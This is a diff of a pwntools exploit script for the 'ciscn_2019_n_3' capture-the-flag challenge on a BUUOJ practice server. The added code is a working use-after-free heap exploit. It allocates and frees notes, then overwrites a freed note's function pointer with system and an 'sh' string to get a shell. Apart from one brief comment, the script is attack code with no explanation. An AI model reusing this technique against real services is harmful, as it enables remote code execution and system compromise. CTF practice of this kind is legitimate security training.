@@ -28,14 +28,30 @@ uu64    = lambda data               :u64(data.ljust(8,'\0'))
 leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
 
 context.log_level = 'DEBUG'
-binary = './pwn'
+binary = './ciscn_2019_n_3'
 context.binary = binary
 elf = ELF(binary)
-p = remote('node3.buuoj.cn',29776) if argv[1]=='r' else process(binary)
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+p = remote('node3.buuoj.cn',28460) if argv[1]=='r' else process(binary)
 
 # start
+def add(index,len,content='a'):
+	sla('CNote > ','1')
+	sla('Index > ',str(index))
+	sla('Type > ','2')
+	sla('Length > ',str(len))
+	sla('Value > ',content)
 
+def delete(index):
+	sla('CNote > ','2')
+	sla('Index > ',str(index))
+
+add(0,0x10)
+add(1,0x10)
+delete(0)
+delete(1)
+add(2,0xc,'sh\x00\x00'+p32(elf.sym['system']))
+# 0xc from 1, then 0xc from 0
+delete(0)
 # end
 
 itr()
